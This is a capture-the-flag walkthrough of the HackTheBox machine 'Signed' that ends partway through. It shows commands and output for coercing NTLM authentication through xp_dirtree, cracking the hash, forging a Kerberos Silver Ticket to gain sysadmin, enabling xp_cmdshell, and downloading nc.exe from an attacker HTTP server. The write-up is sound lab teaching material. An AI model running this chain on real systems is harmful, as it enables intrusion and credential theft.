---
icon: cannabis
cover: ../../../../.gitbook/assets/Screenshot 2026-02-07 153219.png
coverY: 3.127592708988058
---

# HTB-SIGNED (S9)

### Initial Reconnaissance and Enumeration

#### Network Configuration

First, I configured my local hosts file to enable proper domain name resolution for the target machine.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ echo "10.10.11.90 DC01.SIGNED.HTB SIGNED.HTB dc01.signed.htb signed.htb" | sudo tee -a /etc/hosts
```

**Purpose of this step:**

* Maps the IP address 10.10.11.90 to various hostname formats
* Required for Kerberos authentication which relies on FQDNs
* Allows using domain names instead of IP addresses in commands

***

#### Port Scanning

I performed an aggressive full-port scan to identify all open services.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ nmap -p- -T4 -A -v 10.10.11.90
```

**Scan Results:**

```
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for SIGNED.HTB (10.10.11.90)
Host is up (0.25s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM

| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-11T18:31:24
|_Not valid after:  2055-10-11T18:31:24

| ms-sql-ntlm-info: 
|   10.10.11.90:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763

| ms-sql-info: 
|   10.10.11.90:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

Host script results:
|_clock-skew: mean: -25m44s, deviation: 0s, median: -25m44s
```

**Critical Findings from Scan:**

1. **Only port 1433 is accessible externally** - This is the Microsoft SQL Server port
2. **SQL Server version** - Microsoft SQL Server 2022 RTM (16.00.1000.00)
3. **Domain information revealed:**
   * NetBIOS Domain Name: SIGNED
   * Computer Name: DC01
   * DNS Domain: SIGNED.HTB
   * This indicates the target is a Domain Controller
4. **Clock skew** - Approximately 25 minutes behind our time
5. **SSL certificate** - Self-signed certificate in use

**Why this matters:**

* Only having MSSQL exposed limits our initial attack surface
* The target being a Domain Controller means compromising it gives us full domain access
* Clock skew may affect Kerberos authentication timing
* Self-signed SSL certificate indicates default installation

***

### MSSQL Access and Privilege Analysis

#### Initial Connection with Provided Credentials

I was provided with initial low-privilege credentials for MSSQL access.

**Credentials:**

* Username: `scott`
* Password: `Sm230#C5NatH`
* Domain: `signed.htb`

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ impacket-mssqlclient signed.htb/scott:'Sm230#C5NatH'@10.10.11.90
```

**Command explanation:**

* `impacket-mssqlclient`: Impacket's MSSQL client tool for connecting to SQL Server
* `signed.htb/scott`: Domain\Username format
* Password enclosed in single quotes to preserve special characters
* `@10.10.11.90`: Target IP address

**Connection Output:**

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands

SQL (scott  guest@master)>
```

**Analysis of connection details:**

* **Encryption required** - Connection uses TLS encryption
* **Database context** - Connected to 'master' database
* **User mapping** - `scott` is mapped to `guest` user (very limited privileges)
* **SQL Server instance** - DC01\SQLEXPRESS (Express Edition installed)

**Why the guest mapping matters:** The guest user in SQL Server has minimal permissions by default. This means even though we authenticated successfully, we cannot perform administrative operations.

***

#### Testing for Administrative Privileges

I attempted to enable `xp_cmdshell`, a stored procedure that allows operating system command execution.

```sql
SQL (scott  guest@master)> enable_xp_cmdshell
```

**Result:**

```
[-] ERROR(DC01\SQLEXPRESS): Line 1: User does not have permission to perform this action.
[-] ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
[-] ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(DC01\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
[-] ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
```

**What these errors tell us:**

1. User lacks permission to perform actions - Not a member of sysadmin role
2. Cannot run RECONFIGURE - Required to change server configuration
3. xp\_cmdshell either disabled or not available to guest users
4. We need to find a path to sysadmin privileges

***

#### Enumerating Server Principals and Logins

To understand the security landscape, I enumerated all server-level principals (logins, users, groups).

```sql
SQL (scott  guest@master)> SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S', 'U', 'G');
```

**Query explanation:**

* `sys.server_principals`: System view containing all server-level security principals
* `type IN ('S', 'U', 'G')`: Filter for SQL logins (S), Windows users (U), and Windows groups (G)
* `is_disabled`: Shows if the login is currently disabled

**Output:**

```
name                          type_desc         is_disabled
---------------------------   ---------------   -----------
sa                           SQL_LOGIN         0
##MS_PolicyEventProcessingLogin##  SQL_LOGIN   1
##MS_PolicyTsqlExecutionLogin##    SQL_LOGIN   1
SIGNED\IT                    WINDOWS_GROUP     0
SIGNED\mssqlsvc              WINDOWS_LOGIN     0
```

**Critical discoveries:**

1. **sa account exists** - System administrator account (standard in SQL Server)
2. **SIGNED\IT** - A Windows domain group has SQL Server access
3. **SIGNED\mssqlsvc** - A Windows domain service account has access
4. **Policy logins disabled** - Certificate-based logins are disabled

**Why this enumeration matters:**

* Domain accounts indicate Active Directory integration
* The presence of a service account suggests we might capture its credentials
* The IT group might have elevated privileges we can abuse

***

#### Checking sysadmin Role Membership

I queried which principals are members of the sysadmin server role.

```sql
SQL (scott  guest@master)> SELECT r.name AS role_name, m.name AS member_name 
FROM sys.server_principals r 
JOIN sys.server_role_members rm ON r.principal_id = rm.role_principal_id 
JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id 
WHERE r.name = 'sysadmin';
```

**Query breakdown:**

* Joins `sys.server_principals` with `sys.server_role_members`
* Filters for the 'sysadmin' role specifically
* Returns both the role name and member names

**Output:**

```
role_name   member_name
---------   ---------------------------
sysadmin    sa
sysadmin    SIGNED\IT
sysadmin    NT SERVICE\SQLWriter
sysadmin    NT SERVICE\Winmgmt
sysadmin    NT SERVICE\MSSQLSERVER
sysadmin    NT SERVICE\SQLSERVERAGENT
```

**Critical finding - The attack path becomes clear:**

The **SIGNED\IT** Windows group has sysadmin privileges on SQL Server. This is the key to our privilege escalation strategy.

**Why this is significant:**

* If we can claim membership in the SIGNED\IT group, we gain full sysadmin access
* This can be achieved through Kerberos ticket manipulation (Silver Ticket attack)
* sysadmin role members can enable xp\_cmdshell and execute OS commands
* NT SERVICE accounts are standard system accounts

***

#### Verifying Extended Stored Procedure Access

Even without sysadmin privileges, I checked if I could execute other extended stored procedures.

```sql
SQL (scott  guest@master)> SELECT HAS_PERMS_BY_NAME('master..xp_dirtree','OBJECT','EXECUTE') AS can_execute;
```

**What this query does:**

* `HAS_PERMS_BY_NAME`: Function that checks permissions for a specific object
* `master..xp_dirtree`: The extended stored procedure we're checking
* `OBJECT`: Specifies we're checking an object (not a server-level permission)
* `EXECUTE`: The specific permission we're checking for

**Output:**

```
can_execute
-----------
1
```

**This result is extremely important:**

* A value of `1` means we CAN execute xp\_dirtree
* xp\_dirtree can access UNC paths (network file paths)
* When SQL Server accesses a UNC path, it authenticates using its service account
* We can capture this authentication attempt and extract the password hash

***

### NTLM Hash Capture via xp\_dirtree

#### Understanding the Attack Vector

The `xp_dirtree` extended stored procedure is designed to display a directory tree structure. However, when pointed at a UNC path (network path), it causes the SQL Server service to attempt authentication to that remote server using NTLM.

**The attack flow:**

1. We run a fake SMB server (Responder) on our attack machine
2. We execute xp\_dirtree pointing to our fake SMB server
3. SQL Server attempts to authenticate to our server
4. Our server captures the NTLM authentication attempt
5. We extract the NTLMv2 hash from this authentication
6. We crack the hash offline to recover the plaintext password

***

#### Setting Up Responder

Responder is a tool that implements various poisoning and spoofing attacks, but we'll use it as a simple SMB server to capture NTLM hashes.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ sudo responder -I tun0 -v
```

**Command explanation:**

* `sudo`: Required for binding to privileged ports (SMB uses port 445)
* `-I tun0`: Listen on the tun0 interface (HackTheBox VPN interface)
* `-v`: Verbose mode to see detailed output

**Responder startup output:**

```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Listening for events...
```

**What Responder is now doing:**

* Listening on multiple ports for various protocols
* Most importantly, the SMB server is running on port 445
* Ready to capture any NTLM authentication attempts
* Will log all captured hashes with timestamps

***

#### Forcing NTLM Authentication

Now I trigger the SQL Server to connect to our malicious SMB server.

```sql
SQL (scott  guest@master)> EXEC xp_dirtree '\\10.10.14.23\share';
```

**Command breakdown:**

* `EXEC xp_dirtree`: Execute the xp\_dirtree stored procedure
* `\\10.10.14.23\share`: UNC path pointing to our attack machine
  * `\\10.10.14.23`: Our attacker IP address
  * `\share`: Any share name (doesn't need to exist)

**What happens behind the scenes:**

1. xp\_dirtree attempts to list the contents of `\\10.10.14.23\share`
2. Windows networking automatically attempts SMB connection
3. SQL Server service account (mssqlsvc) authenticates to our fake server
4. Responder captures the full NTLM authentication exchange

**SQL Server output:**

```
subdirectory    depth
------------    -----
```

The empty result is expected - our fake share has no contents.

***

#### Capturing the NTLMv2 Hash

**Responder output showing the captured hash:**

```
[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:023c9f94248b8d3d:4877FCA78E84B52D0C36D57A13B2EEE1:0101000000000000801F56E0E33ADC01F912556F72626A820000000002000800380048004400490001001E00570049004E002D005000360035005100300032005300370046004B0052000400340057005300370046004B0052002E0038004800440049002E004C004F00430041004C000300140038004800440049002E004C004F00430041004C000500140038004800440049002E004C004F00430041004C0007000800801F56E0E33ADC01060004000200000008003000300000000000000000000000003000003663E3F2445BE9D4922A38A20F1E4A6D6879ECF61660D45DC747E21A3E1D280F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000
```

**Breaking down the captured information:**

* **Client IP**: 10.10.11.90 (our target)
* **Username**: SIGNED\mssqlsvc (the service account running SQL Server)
* **Hash**: The complete NTLMv2 challenge-response

**Understanding the NTLMv2 hash format:**

```
mssqlsvc::SIGNED:023c9f94248b8d3d:4877FCA78E84B52D0C36D57A13B2EEE1:0101000000...
|        |  |     |                |                              |
|        |  |     |                |                              +-- Server challenge and client response
|        |  |     |                +-- NTProofStr (first 16 bytes of response)
|        |  |     +-- Server challenge (8 bytes)
|        |  +-- Domain name
|        +-- Username
+-- Format identifier
```

**Why this hash is valuable:**

* Contains the encrypted password
* Can be cracked offline without further interaction with the target
* NTLMv2 is more secure than NTLMv1 but still crackable with dictionary attacks
* Once cracked, gives us the plaintext password for the mssqlsvc account

***

#### Saving the Hash for Cracking

I saved the captured hash to a file for offline cracking.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ echo 'mssqlsvc::SIGNED:023c9f94248b8d3d:4877FCA78E84B52D0C36D57A13B2EEE1:0101000000000000801F56E0E33ADC01F912556F72626A820000000002000800380048004400490001001E00570049004E002D005000360035005100300032005300370046004B0052000400340057005300370046004B0052002E0038004800440049002E004C004F00430041004C000300140038004800440049002E004C004F00430041004C000500140038004800440049002E004C004F00430041004C0007000800801F56E0E33ADC01060004000200000008003000300000000000000000000000003000003663E3F2445BE9D4922A38A20F1E4A6D6879ECF61660D45DC747E21A3E1D280F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000' > mssqlsvc.hash
```

**File created:**

* `mssqlsvc.hash` contains the complete NTLMv2 hash
* Format recognized by various password cracking tools
* Can be used with John the Ripper, hashcat, or other crackers

***

#### Cracking the Hash with John the Ripper

I used John the Ripper to perform a dictionary attack against the captured hash.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt mssqlsvc.hash
```

**Command breakdown:**

* `john`: John the Ripper password cracker
* `--wordlist=/usr/share/wordlists/rockyou.txt`: Use the rockyou.txt wordlist
  * Contains approximately 14 million commonly used passwords
  * Compiled from real password breaches
* `mssqlsvc.hash`: The file containing our captured hash

**Cracking process output:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)
1g 0:00:00:03 DONE (2025-02-07 15:42) 0.2915g/s 3145Kp/s 3145Kc/s 3145KC/s
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

**Results analysis:**

* **Password found**: `purPLE9795!@`
* **Time taken**: Approximately 3 seconds
* **Speed**: 3.145 million passwords tested per second
* **Success rate**: 1 password recovered (1g)

**Why the password cracked quickly:**

* The password exists in the rockyou.txt wordlist
* While it contains special characters and mixed case, it follows a common pattern
* Dictionary attacks are effective against passwords based on words
* The hash type (NTLMv2) is computationally intensive but not impossible to crack

***

#### Connecting with Compromised Credentials

Now I can authenticate to MSSQL using the cracked credentials.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ impacket-mssqlclient 'signed.htb/mssqlsvc:purPLE9795!@'@10.10.11.90 -windows-auth
```

**Command breakdown:**

* `signed.htb/mssqlsvc`: Domain and username
* `purPLE9795!@`: The cracked password
* `-windows-auth`: Use Windows Authentication (NTLM) instead of SQL Server authentication

**Connection successful:**

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 

SQL (SIGNED\mssqlsvc  dbo@master)>
```

**Key difference from previous connection:**

* Previously as `scott`: `SQL (scott guest@master)>`
* Now as `mssqlsvc`: `SQL (SIGNED\mssqlsvc dbo@master)>`
* Mapped to `dbo` (database owner) instead of `guest`
* This gives us more privileges but still not sysadmin

**Current limitations:**

* Still cannot enable xp\_cmdshell
* Cannot modify server configuration
* Need to escalate to sysadmin role
* This is where the Silver Ticket attack comes in

***

### Silver Ticket Attack for Privilege Escalation

#### Understanding Silver Tickets

A Silver Ticket is a forged Kerberos TGS (Ticket Granting Service) ticket. Unlike Golden Tickets which forge TGT (Ticket Granting Tickets), Silver Tickets target specific services.

**How Kerberos normally works:**

1. User authenticates to DC, receives TGT
2. User presents TGT to DC to request service ticket (TGS)
3. DC validates TGT and issues TGS for requested service
4. User presents TGS to service
5. Service validates TGS and grants access

**How Silver Ticket attack works:**

1. Attacker has service account password hash
2. Attacker forges TGS ticket locally without contacting DC
3. Attacker includes arbitrary group memberships in the ticket
4. Service validates ticket using its own hash (not by contacting DC)
5. Service grants access based on forged group memberships

**Why this works:**

* Services validate TGS tickets using their own password hash
* Services trust the group membership information in the ticket (PAC)
* No communication with DC needed for validation
* DC has no record of this forged ticket being issued

**Requirements for our attack:**

1. Service account NTLM hash (we have: `purPLE9795!@`)
2. Domain SID
3. Target service SPN (Service Principal Name)
4. Group RID we want to claim membership in (SIGNED\IT = 1105)
5. User RID we're impersonating (mssqlsvc = 1103)

***

#### Gathering Required Information

**Step 1: Retrieving Domain SID**

I queried the SID of the SIGNED\IT group to extract the domain SID.

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT SUSER_SID('SIGNED\IT');
```

**What this query does:**

* `SUSER_SID()`: System function that returns the SID for a login name
* Returns binary data representing the SID

**Output (binary hexadecimal):**

```
0x0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000
```

**Understanding SID structure:**

The binary SID format consists of:

* Revision (1 byte): `01`
* Sub-authority count (1 byte): `05` (5 sub-authorities)
* Identifier authority (6 bytes): `000000000005` (NT Authority = 5)
* Sub-authorities (variable): The domain identifier and RID

**Why we need to convert this:**

* Binary format is not human-readable
* We need the standard S-1-5-21-... format
* Need to separate domain SID from the RID

***

**Step 2: Converting Hex SID to Readable Format**

I created a Python script to convert the hexadecimal SID to standard format.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ python3 - <<'PY'
hexs = "0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000"
b = bytes.fromhex(hexs)
rev = b[0]
subc = b[1]
ident = int.from_bytes(b[2:8], 'big')
subs = [str(int.from_bytes(b[8+4*i:12+4*i], 'little')) for i in range(subc)]
sid = f"S-{rev}-{ident}" + ''.join('-' + s for s in subs)
print(sid)
PY
```

**Script explanation:**

```python
hexs = "0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000"  # Remove 0x prefix
b = bytes.fromhex(hexs)                    # Convert to bytes
rev = b[0]                                 # Byte 0: Revision (1)
subc = b[1]                                # Byte 1: Sub-authority count (5)
ident = int.from_bytes(b[2:8], 'big')      # Bytes 2-7: Identifier authority (5)
subs = []                                  # Sub-authorities list
for i in range(subc):                      # Loop through sub-authorities
    offset = 8 + 4*i                       # Calculate offset
    sub = int.from_bytes(b[offset:offset+4], 'little')  # Read as little-endian
    subs.append(str(sub))                  # Add to list
sid = f"S-{rev}-{ident}-" + '-'.join(subs) # Format as standard SID
```

**Output:**

```
S-1-5-21-4088429403-1159899800-2753317549-1105
```

**Breaking down the SID:**

* `S-1`: SID revision (always 1)
* `5`: Identifier authority (NT Authority)
* `21`: Domain SID sub-authority marker
* `4088429403-1159899800-2753317549`: Unique domain identifier
* `1105`: Relative Identifier (RID) for the SIGNED\IT group

**Extracted values:**

* **Domain SID**: `S-1-5-21-4088429403-1159899800-2753317549`
* **IT Group RID**: `1105`

***

**Step 3: Getting mssqlsvc User SID**

I queried the SID for the mssqlsvc user account.

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT SUSER_SID('SIGNED\mssqlsvc');
```

**Output (binary hex):**

```
0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
```

Converting using the same Python script:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ python3 - <<'PY'
hexs = "0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000"
b = bytes.fromhex(hexs)
rev = b[0]
subc = b[1]
ident = int.from_bytes(b[2:8], 'big')
subs = [str(int.from_bytes(b[8+4*i:12+4*i], 'little')) for i in range(subc)]
sid = f"S-{rev}-{ident}" + ''.join('-' + s for s in subs)
print(sid)
PY
```

**Output:**

```
S-1-5-21-4088429403-1159899800-2753317549-1103
```

**Extracted values:**

* Same domain SID (as expected - same domain)
* **mssqlsvc User RID**: `1103`

**Why we need both RIDs:**

* User RID (1103): Identifies who we're impersonating
* Group RID (1105): The privileged group we claim membership in
* Both are required for creating the PAC (Privilege Attribute Certificate) in the ticket

***

**Step 4: Converting Password to NTLM Hash**

While we know the password, we need its NTLM hash for ticket encryption.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ iconv -f ASCII -t UTF-16LE <(printf 'purPLE9795!@') | openssl dgst -md4
```

**Command breakdown:**

* `printf 'purPLE9795!@'`: Output the password
* `iconv -f ASCII -t UTF-16LE`: Convert to UTF-16LE encoding
  * NTLM requires UTF-16LE encoding of the password
  * `-f ASCII`: From ASCII encoding
  * `-t UTF-16LE`: To UTF-16 Little Endian
* `openssl dgst -md4`: Calculate MD4 hash
  * NTLM uses MD4 hashing algorithm
  * `dgst`: Digest (hash) command
  * `-md4`: Use MD4 algorithm

**Output:**

```
MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc
```

**NTLM Hash:** `ef699384c3285c54128a3ee1ddb1a0cc`

**Understanding NTLM hash calculation:**

1. Take password in plaintext: `purPLE9795!@`
2. Convert to UTF-16LE: `p\0u\0r\0P\0L\0E\09\07\09\05\0!\0@\0`
3. Calculate MD4 hash: `ef699384c3285c54128a3ee1ddb1a0cc`
4. This hash is used to encrypt Kerberos tickets

***

#### Creating the Silver Ticket

Now I have all required components to forge the Silver Ticket.

**Components summary:**

* Domain SID: `S-1-5-21-4088429403-1159899800-2753317549`
* User RID: `1103` (mssqlsvc)
* Group RID: `1105` (SIGNED\IT - has sysadmin)
* NTLM Hash: `ef699384c3285c54128a3ee1ddb1a0cc`
* Domain: `signed.htb`
* Service: `MSSQLSvc/DC01.signed.htb:1433`

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc \
    -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
    -domain signed.htb \
    -spn MSSQLSvc/DC01.signed.htb:1433 \
    -groups 1105 \
    -user-id 1103 \
    mssqlsvc
```

**Command breakdown:**

* `ticketer.py`: Impacket tool for creating Kerberos tickets
* `-nthash ef699384c3285c54128a3ee1ddb1a0cc`: Service account NTLM hash for encryption
* `-domain-sid S-1-5-21-...`: Domain SID (without the RID)
* `-domain signed.htb`: Domain name
* `-spn MSSQLSvc/DC01.signed.htb:1433`: Service Principal Name
  * Format: ServiceClass/Host:Port
  * MSSQLSvc: MSSQL service class
  * DC01.signed.htb: Target host
  * 1433: MSSQL port
* `-groups 1105`: Claim membership in SIGNED\IT group
* `-user-id 1103`: User RID for mssqlsvc
* `mssqlsvc`: Output filename

**Ticket creation output:**

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

**What ticketer.py created:**

1. **PAC\_LOGON\_INFO**: Contains user and group information
   * User SID: S-1-5-21-...-1103
   * Group SIDs: Including S-1-5-21-...-1105 (SIGNED\IT)
   * This is what the service uses to determine privileges
2. **PAC\_CLIENT\_INFO\_TYPE**: Client information
3. **EncTicketPart**: Encrypted ticket part
   * Session key
   * Ticket flags
   * Encrypted with service account hash
4. **EncTGSRepPart**: Encrypted TGS response part
5. **Checksums**:
   * PAC\_SERVER\_CHECKSUM: Server signature
   * PAC\_PRIVSVR\_CHECKSUM: Privilege server signature

**File created:** `mssqlsvc.ccache`

* Standard Kerberos credential cache file
* Contains the forged TGS ticket
* Can be used for authentication without a password

***

#### Using the Forged Ticket

I set the Kerberos credential cache environment variable to use our forged ticket.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ export KRB5CCNAME=mssqlsvc.ccache
```

**What this does:**

* `KRB5CCNAME`: Environment variable that specifies the Kerberos credential cache file
* All Kerberos-enabled tools will now use this ticket
* No password needed - the ticket contains all authentication information

***

#### Authenticating with the Silver Ticket

Now I connect to MSSQL using Kerberos authentication with our forged ticket.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ mssqlclient.py -k -no-pass DC01.SIGNED.HTB
```

**Command breakdown:**

* `-k`: Use Kerberos authentication
* `-no-pass`: Don't prompt for password (use the ticket)
* `DC01.SIGNED.HTB`: Must use FQDN for Kerberos
  * Kerberos relies on DNS names, not IP addresses
  * Must match the SPN in the ticket

**Connection successful:**

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 

SQL (SIGNED\mssqlsvc  dbo@master)>
```

**Notice the change:**

* Previous instance name: `DC01\SQLEXPRESS`
* Current instance name: `DC01` (default instance)
* This is because Kerberos connected to the default instance

***

#### Verifying Privilege Escalation

I verified that the forged ticket successfully granted sysadmin privileges.

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
```

**Query explanation:**

* `IS_SRVROLEMEMBER()`: Function that checks server role membership
* `'sysadmin'`: The server role we're checking
* Returns 1 if member, 0 if not, NULL if invalid

**Output:**

```
-----------
1
```

**Success! The value 1 confirms:**

* We are now members of the sysadmin role
* The forged group membership in SIGNED\IT was accepted
* We have full administrative control over SQL Server

**What this means:**

* Can enable any configuration option
* Can execute xp\_cmdshell
* Can access all databases
* Can create/modify/delete any object
* Can read any file the SQL Server service account can access

***

#### Enabling Command Execution

With sysadmin privileges, I can now enable xp\_cmdshell.

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
```

**Step-by-step explanation:**

1.  **Enable advanced options:**

    ```sql
    EXEC sp_configure 'show advanced options', 1;
    ```

    * `sp_configure`: System stored procedure to view/change server configuration
    * `'show advanced options'`: Configuration option name
    * `1`: Enable (0 would disable)
    * This allows viewing advanced configuration options
2.  **Apply the configuration:**

    ```sql
    RECONFIGURE;
    ```

    * Applies the configuration change immediately
    * Without this, changes are pending but not active
3.  **Enable xp\_cmdshell:**

    ```sql
    EXEC sp_configure 'xp_cmdshell', 1;
    ```

    * Enables the xp\_cmdshell extended stored procedure
    * xp\_cmdshell is disabled by default for security
4.  **Apply xp\_cmdshell configuration:**

    ```sql
    RECONFIGURE;
    ```

    * Makes xp\_cmdshell available for use

**Output:**

```
[*] INFO(DC01): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(DC01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

***

#### Testing Command Execution

I verified that xp\_cmdshell is working.

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "whoami"
```

**Output:**

```
output
----------------
signed\mssqlsvc
NULL
```

**Analysis:**

* Commands execute as the SQL Server service account (mssqlsvc)
* `NULL` appears because xp\_cmdshell returns each line of output separately
* We now have operating system command execution

**Current capabilities:**

* Execute any Windows command
* Read files accessible to mssqlsvc
* Write files to accessible locations
* Download tools from our attack machine
* Establish reverse shells

***

### Obtaining User Flag

#### Setting Up File Transfer

To get a proper interactive shell, I need to download netcat to the target.

**Starting HTTP server on attack machine:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ python3 -m http.server 80
```

**Output:**

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**Why use Python HTTP server:**

* Simple built-in web server
* Serves files from current directory
* Easy way to transfer files to compromised systems
* No configuration needed

***

#### Downloading nc.exe

I downloaded netcat to the target's temporary directory.

```sql
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "powershell wget -UseBasicParsing http://10.10.14.23/nc.exe -OutFile %temp%\nc.exe"
```

**Command breakdown:**

* `powershell`: Execute PowerShell command
* `wget -UseBasicParsing`: PowerShell alias for Invoke-WebRequest
  * `-UseBasicParsing`: Don't parse HTML, just download
* `http://10.10.14.23/nc.exe`: URL of file on our HTTP server
* `-OutFile %temp%\nc.exe`: Save to user's temp directory
  * `%temp%`: Environment variable pointing to temp folder
  * Expands to `C:\Users\mssqlsvc\AppData\Local\Temp`

**HTTP Server log showing successful download:**

```
